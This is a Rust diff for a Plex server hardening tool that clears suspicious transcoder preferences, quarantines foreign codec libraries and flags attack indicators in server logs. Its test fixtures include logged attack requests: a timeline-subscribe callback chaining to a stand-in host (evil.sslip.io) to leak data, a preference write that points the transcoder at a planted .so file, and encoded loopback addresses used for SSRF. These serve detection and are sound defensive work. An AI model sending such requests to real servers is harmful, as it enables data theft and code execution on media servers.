+            Err(e) => errors.push(format!("clear {id}: {e}")),
         }
     }
 
-    if !dry_run {
-        for id in &cleared_prefs {
-            client
-                .set_pref(id, "")
-                .await
-                .with_context(|| format!("clear {id}"))?;
+    let mut remote_disabled = false;
+    if args.disable_remote && !dry_run {
+        match client.set_pref("PublishServerOnPlexOnlineKey", "0").await {
+            Ok(()) => remote_disabled = true,
+            Err(e) => errors.push(format!("disable remote publishing: {e}")),
         }
-        if args.disable_remote {
-            client
-                .set_pref("PublishServerOnPlexOnlineKey", "0")
-                .await
-                .context("disable remote publishing")?;
+    }
+
+    let mut quarantine = Vec::new();
+    let mut transcoders_killed = false;
+    let mut restarted = false;
+    if let Some(t) = args.target.as_deref() {
+        let codecs_dir = format!("{}/Codecs", args.data_dir);
+        match list_codec_entries(args.runtime, t, &args.data_dir).await {
+            Err(e) => errors.push(format!("{e:#}")),
+            Ok(entries) => {
+                let qdir = format!("{}/Codecs.quarantine", args.data_dir);
+                let stamp = plugin_toolkit::time::Timestamp::now().compact();
+                let suspects: Vec<CodecSuspect> = classify_codecs(&codecs_dir, &entries, &prefs)
+                    .into_iter()
+                    .filter(|s| s.quarantinable)
+                    .collect();
+                let mut qdir_ready = dry_run;
+                if !dry_run && !suspects.is_empty() {
+                    let mut mk = guest_as(args.runtime, t, &args.run_as);
+                    mk.arg("mkdir").arg("-p").arg("--").arg(&qdir);
+                    match capture(mk).await {
+                        Ok(_) => qdir_ready = true,
+                        Err(e) => errors.push(format!("create quarantine dir: {e:#}")),
+                    }
+                }
+                for s in suspects {
+                    let dest = quarantine_path(&qdir, &s.path, &stamp);
+                    let error = if !safe_codec_path(&args.data_dir, &s.path) {
+                        Some("refused: path outside Codecs or unsafe".to_string())
+                    } else if !qdir_ready {
+                        Some("quarantine dir unavailable".to_string())
+                    } else if dry_run {
+                        None
+                    } else {
+                        quarantine_one(args.runtime, t, &args.run_as, &s.path, &dest)
+                            .await
+                            .err()
+                            .map(|e| format!("{e:#}"))
+                    };
+                    quarantine.push(QuarantineResult {
+                        source: s.path,
+                        dest,
+                        reasons: s.reasons,
+                        moved: !dry_run && error.is_none(),
+                        error,
+                    });
+                }
+            }
         }
+
+        if args.kill_transcoders && !dry_run {
+            let mut kill = guest(args.runtime, t);
+            kill.arg("pkill").arg("-f").arg("Plex Transcoder");
+            match output_of(kill).await {
+                Ok((Some(0 | 1), _)) => transcoders_killed = true,
+                Ok((code, _)) => errors.push(format!("pkill transcoders exited {code:?}")),
+                Err(e) => errors.push(format!("{e:#}")),
+            }
+        }
+
+        if args.restart && !dry_run {
+            let restart = PlexRestartArgs {
+                runtime: args.runtime,
+                vmid: t.parse().ok(),
+                container: t.to_string(),
+            };
+            match lifecycle::restart_service(restart).await {
+                Ok(_) => restarted = true,
+                Err(e) => errors.push(format!("restart: {e:#}")),
+            }
+        }
+    } else if args.kill_transcoders || args.restart {
+        errors.push("kill_transcoders/restart need a target".to_string());
+    }
+
+    let mut follow_ups: Vec<String> = vec![FOLLOW_UPS[0].to_string()];
+    if !restarted {
+        follow_ups.push(FOLLOW_UPS[1].to_string());
     }
 
     Ok(PlexSecurityHardenOutput {
         dry_run,
         cleared_prefs,
-        quarantined,
-        remote_disabled: args.disable_remote,
+        remote_disabled,
+        remote_disable_planned: args.disable_remote,
+        quarantine,
+        transcoders_killed,
+        restarted,
+        errors,
+        follow_ups,
     })
 }
 
@@ -524,6 +970,16 @@ mod tests {
             .collect()
     }
 
+    const D: &str = "/d/Codecs";
+
+    fn entry(path: &str, mtime: f64, symlink: bool) -> CodecEntry {
+        CodecEntry {
+            path: format!("{D}/{path}"),
+            mtime,
+            symlink,
+        }
+    }
+
     #[test]
     fn version_threshold() {
         assert!(version_below("1.42.2.10156-f737b826c", MIN_PATCHED_VERSION));
@@ -533,7 +989,7 @@ mod tests {
     }
 
     #[test]
-    fn detects_non_empty_transcoder_options() {
+    fn detects_suspicious_prefs() {
         let prefs = kv(&[
             (
                 "TranscoderH264Options",
@@ -542,17 +998,39 @@ mod tests {
             ("TranscoderH264BackgroundPreset", "veryfast"),
             ("TranscoderHevcOptions", "  "),
             ("FriendlyName", "media"),
+            ("SomeOtherPref", "/d/Codecs/evil"),
+            ("LibPath", "x.so"),
         ]);
-        let hits = suspicious_transcoder_prefs(&prefs);
-        assert_eq!(hits.len(), 1);
-        assert_eq!(hits[0].0, "TranscoderH264Options");
+        let ids: Vec<String> = suspicious_prefs(&prefs)
+            .into_iter()
+            .map(|(i, _)| i)
+            .collect();
+        assert_eq!(
+            ids,
+            vec!["TranscoderH264Options", "SomeOtherPref", "LibPath"]
+        );
+        assert_eq!(prefs_to_clear(&prefs), vec!["TranscoderH264Options"]);
     }
 
     #[test]
     fn classifies_codec_filenames() {
-        assert!(is_shipped_codec("libh264_decoder.so"));
-        assert!(is_shipped_codec("libaac_encoder.so"));
-        assert!(is_shipped_codec("libhevc_mediacodec_decoder.so"));
+        for n in [
+            "libaac_decoder",
+            "libaac_encoder",
+            "libac3_decoder",
+            "libdca_decoder",
+            "libh264_decoder",
+            "libhevc_decoder",
+            "liblibmp3lame_encoder",
+            "liblibx264_encoder",
+            "libmp3_decoder",
+            "libmpeg2video_decoder",
+            "libmpeg4_decoder",
+            "libpcm_bluray_decoder",
+            "libvc1_decoder",
+        ] {
+            assert!(is_shipped_codec(&format!("{n}.so")), "{n}");
+        }
         assert!(!is_shipped_codec("zz3.so"));
         assert!(!is_shipped_codec("lib_decoder.so"));
         assert!(!is_shipped_codec("libh264_decoder.so.bak"));
@@ -560,19 +1038,83 @@ mod tests {
     }
 
     #[test]
-    fn foreign_codecs_only_in_linux_dirs() {
-        let paths: Vec<String> = [
-            "/d/Codecs/abc-linux-x86_64/libh264_decoder.so",
-            "/d/Codecs/abc-linux-x86_64/zz7.so",
-            "/d/Codecs/other/zz8.so",
-        ]
-        .iter()
-        .map(|s| s.to_string())
-        .collect();
+    fn parses_find_print0() {
+        let out = "1700000000.5 f /d/Codecs/a-linux-x86_64/lib h264_decoder.so\x001700000001.0 l /d/Codecs/x\0";
+        let e = parse_find_output(out);
+        assert_eq!(e.len(), 2);
+        assert_eq!(e[0].path, "/d/Codecs/a-linux-x86_64/lib h264_decoder.so");
+        assert!(!e[0].symlink);
+        assert!(e[1].symlink);
+    }
+
+    #[test]
+    fn clean_install_has_no_suspects() {
+        let mut entries = vec![
+            entry(".device-id", 100.0, false),
+            entry("EasyAudioEncoder-abc-linux-x86_64.zip", 100.0, false),
+            entry(
+                "EasyAudioEncoder-abc-linux-x86_64/EasyAudioEncoder/eae",
+                100.0,
+                false,
+            ),
+        ];
+        for n in [
+            "aac_decoder",
+            "h264_decoder",
+            "hevc_decoder",
+            "libx264_encoder",
+        ] {
+            entries.push(entry(&format!("abc-linux-x86_64/lib{n}.so"), 100.0, false));
+        }
+        assert!(classify_codecs(D, &entries, &[]).is_empty());
+    }
+
+    #[test]
+    fn flags_foreign_symlink_mtime_and_pref_referenced() {
+        let entries = vec![
+            entry(".device-id", 100.0, false),
+            entry("EasyAudioEncoder-abc-linux-x86_64.zip", 100.0, true),
+            entry("abc-linux-x86_64/libaac_decoder.so", 100.0, false),
+            entry("abc-linux-x86_64/libh264_decoder.so", 100.0, false),
+            entry("abc-linux-x86_64/libhevc_decoder.so", 100.0, false),
+            entry("abc-linux-x86_64/zz1.so", 100.0, false),
+            entry("abc-linux-x86_64/libzz_decoder.so", 900_000.0, false),
+            entry("abc-linux-x86_64/libvc1_decoder.so", 100.0, true),
+            entry("abc-linux-x86_64/libmp3_decoder.so", 100.0, false),
+        ];
+        let prefs = kv(&[(
+            "TranscoderH264Options",
+            "dump-yuv=/d/Codecs/abc-linux-x86_64/libmp3_decoder.so",
+        )]);
+        let s = classify_codecs(D, &entries, &prefs);
+        let paths: Vec<&str> = s
+            .iter()
+            .map(|x| x.path.rsplit('/').next().unwrap())
+            .collect();
         assert_eq!(
-            foreign_codecs(&paths),
-            vec!["/d/Codecs/abc-linux-x86_64/zz7.so"]
+            paths,
+            vec![
+                "EasyAudioEncoder-abc-linux-x86_64.zip",
+                "zz1.so",
+                "libzz_decoder.so",
+                "libvc1_decoder.so",
+                "libmp3_decoder.so"
+            ]
         );
+        assert!(!s[0].quarantinable);
+        assert!(s[2].reasons.iter().any(|r| r.contains("mtime")));
+        assert!(s[4].reasons.iter().any(|r| r.contains("pref")));
+    }
+
+    #[test]
+    fn path_safety() {
+        assert!(valid_data_dir("/var/lib/plex"));
+        assert!(!valid_data_dir("var/lib"));
+        assert!(!valid_data_dir("/var/../etc"));
+        assert!(safe_codec_path("/d", "/d/Codecs/a/zz.so"));
+        assert!(!safe_codec_path("/d", "/d/Codecs/../x"));
+        assert!(!safe_codec_path("/d", "/etc/passwd"));
+        assert!(!safe_codec_path("/d", "/d/Codecs/a\nb"));
     }
 
     #[test]
@@ -583,59 +1125,108 @@ mod tests {
                 "/d/Codecs/abc-linux-x86_64/zz7.so",
                 "20261024-000000"
             ),
-            "/d/Codecs.quarantine/abc-linux-x86_64__zz7.so.20261024-000000"
+            "/d/Codecs.quarantine/abc-linux-x86_64__zz7.so.20261024-000000.quarantined"
         );
     }
 
     #[test]
-    fn scrubs_plex_tokens() {
+    fn scrubs_secrets() {
         let s = scrub_tokens("GET /x?a=1&X-Plex-Token=SECRETTOKEN123&b=2");
         assert!(!s.contains("SECRETTOKEN123"));
         assert!(s.contains("&b=2"));
         let h = scrub_tokens("x-plex-token: ABCDEF0123 trailing");
         assert!(!h.contains("ABCDEF0123"));
         assert!(h.contains("trailing"));
+        let a = scrub_tokens("?authToken=AAA111&plexToken=BBB222");
+        assert!(!a.contains("AAA111") && !a.contains("BBB222"));
+        let g =
+            scrub_tokens("function/GetResultFromNetwork?url=http://evil.sslip.io:8080/leak/42# x");
+        assert!(!g.contains("evil.sslip.io"));
+        let l = scrub_tokens("GET /leak/SECRETID/more");
+        assert!(!l.contains("SECRETID") && l.contains("/more"));
+        let t = scrub_tokens("name TKN_abc123 tail");
+        assert!(!t.contains("abc123") && t.contains("tail"));
     }
 
     const POLL: &str = "Oct 24, 2026 03:12:01.123 [140001] DEBUG - Request: [203.0.113.7:51514 (WAN)] GET /player/proxy/poll?deviceName=plexscan-deadbeef-1 (8 live) #1a2b Signed-in";
     const SUBSCRIBE: &str = "Oct 24, 2026 03:12:02.456 [140002] DEBUG - Request: [203.0.113.7:51515 (WAN)] GET /player/timeline/subscribe?commandID=1&protocol=http://127.0.0.1:32400/system/agents/z/searchOne?identifier=com.plexapp.agents.thetvdb/function/GetResultFromNetwork?url=http://evil.sslip.io:8080/leak/42#";
-    const PREFS: &str = "Oct 24, 2026 03:13:00.000 [140003] DEBUG - Request: [203.0.113.7:51516 (WAN)] PUT /:/prefs?TranscoderH264Options=dump-yuv=/x/zz1.so:qp=0&X-Plex-Token=FAKETOKEN999";
+    const PREFS: &str = "Oct 24, 2026 03:13:00.000 [140003] DEBUG - Request: [203.0.113.7:51516 (WAN)] PUT /:/prefs?X-Plex-Token=FAKETOKEN999&TranscoderH264Options=dump-yuv=/x/zz1.so:qp=0";
     const LAN_POLL: &str = "Oct 24, 2026 03:14:00.000 [140004] DEBUG - Request: [10.0.0.5:40000 (Subnet)] GET /player/proxy/poll?deviceName=iPhone";
 
     #[test]
     fn parses_wan_poll() {
         let ioc = parse_ioc_line(POLL).unwrap();
-        assert_eq!(ioc.indicator, "plexscan-");
+        assert_eq!(ioc.indicator, "plexscan_player");
+        assert_eq!(ioc.severity, Severity::Critical);
         assert_eq!(ioc.source_ip.as_deref(), Some("203.0.113.7"));
         assert_eq!(ioc.timestamp.as_deref(), Some("Oct 24, 2026 03:12:01.123"));
         assert!(ioc.wan);
     }
 
     #[test]
-    fn parses_loopback_protocol_subscribe() {
+    fn parses_subscribe_callback_and_scrubs_url() {
         let ioc = parse_ioc_line(SUBSCRIBE).unwrap();
-        assert_eq!(ioc.indicator, "protocol=http://127.0.0.1");
+        assert_eq!(ioc.indicator, "timeline_subscribe_callback");
+        assert_eq!(ioc.severity, Severity::Critical);
+        assert!(!ioc.line.contains("evil.sslip.io"));
     }
 
     #[test]
-    fn parses_prefs_and_scrubs_token() {
+    fn loopback_variants_are_critical_from_lan() {
+        for host in [
+            "localhost",
+            "127.1.2.3",
+            "0.0.0.0",
+            "[::1]",
+            "2130706433",
+            "0x7f000001",
+        ] {
+            let line = format!(
+                "t [1] DEBUG - Request: [10.0.0.5:1 (Subnet)] GET /player/timeline/subscribe?protocol=HTTPS%3A%2F%2F{host}:32400/x"
+            );
+            assert_eq!(
+                parse_ioc_line(&line).unwrap().severity,
+                Severity::Critical,
+                "{host}"
+            );
+        }
+        let lan = "t [1] DEBUG - Request: [10.0.0.5:1 (Subnet)] GET /player/timeline/subscribe?protocol=http&port=32500";
+        assert_eq!(parse_ioc_line(lan).unwrap().severity, Severity::Warning);
+    }
+
+    #[test]
+    fn parses_prefs_write_any_position_and_scrubs_token() {
         let ioc = parse_ioc_line(PREFS).unwrap();
-        assert_eq!(ioc.indicator, "PUT /:/prefs?Transcoder");
+        assert_eq!(ioc.indicator, "transcoder_pref_write");
         assert!(!ioc.line.contains("FAKETOKEN999"));
+        let enc =
+            "t [1] DEBUG - Request: [203.0.113.7:1 (WAN)] put /:/prefs?a=1&Foo=DUMP%2DYUV%3D/x.so";
+        assert_eq!(
+            parse_ioc_line(enc).unwrap().indicator,
+            "transcoder_pref_write"
+        );
     }
 
     #[test]
-    fn ignores_lan_companion_poll() {
-        assert!(parse_ioc_line(LAN_POLL).is_none());
-        let iocs = parse_iocs(&[POLL, LAN_POLL, SUBSCRIBE, PREFS].join("\n"));
-        assert_eq!(iocs.len(), 3);
+    fn lan_companion_poll_is_warning() {
+        let ioc = parse_ioc_line(LAN_POLL).unwrap();
+        assert_eq!(ioc.severity, Severity::Warning);
+        assert!(!ioc.wan);
+        let iocs = parse_iocs(&[POLL, LAN_POLL, SUBSCRIBE, PREFS, "noise"].join("\n"));
+        assert_eq!(iocs.len(), 4);
     }
 
     #[test]
-    fn untagged_public_ip_counts_as_wan() {
-        let line = "Oct 24, 2026 03:15:00.000 [1] DEBUG - Request: [198.51.100.9:1234] GET /player/proxy/poll";
-        let ioc = parse_ioc_line(line).unwrap();
-        assert_eq!(ioc.indicator, "/player/proxy/poll");
+    fn client_address_forms() {
+        let cgnat = "t [1] DEBUG - Request: [100.64.1.2:1234] GET /player/proxy/poll";
+        assert_eq!(parse_ioc_line(cgnat).unwrap().severity, Severity::Warning);
+        let mapped = "t [1] DEBUG - Request: [[::ffff:10.0.0.9]:1234] GET /player/proxy/poll";
+        let ioc = parse_ioc_line(mapped).unwrap();
+        assert_eq!(ioc.source_ip.as_deref(), Some("::ffff:10.0.0.9"));
+        assert!(!ioc.wan);
+        let v6 = "t [1] DEBUG - Request: [2001:db8::1] GET /player/proxy/poll";
+        let ioc = parse_ioc_line(v6).unwrap();
+        assert_eq!(ioc.source_ip.as_deref(), Some("2001:db8::1"));
         assert!(ioc.wan);
     }
 }
